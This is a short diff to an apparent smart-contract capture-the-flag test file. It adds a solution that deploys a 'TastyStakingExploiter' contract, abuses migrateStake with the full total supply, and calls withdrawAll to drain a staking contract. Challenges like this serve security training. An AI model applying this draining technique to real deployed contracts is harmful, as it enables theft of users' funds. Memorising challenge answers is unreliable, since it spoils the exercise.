@@ -59,6 +59,18 @@ it("solves the challenge", async function () {
 
   // implement solution here
 
+  // generate mock contract, call migrate, dump tokens. 
+  let pwnFactory = await ethers.getContractFactory('TastyStakingExploiter')
+  let pwner = await pwnFactory.connect(attacker).deploy(tastyStaking.address, steak.address);
+
+  await tastyStaking.connect(attacker).migrateStake(pwner.address, await tastyStaking.connect(attacker).totalSupply());
+  await tastyStaking.connect(attacker).withdrawAll(true);
+
+
+  // await pwner.connect(attacker).pwn();
+  // await pwner.connect(attacker).touchBooty();
+
+
 });
 
 /// expected final state
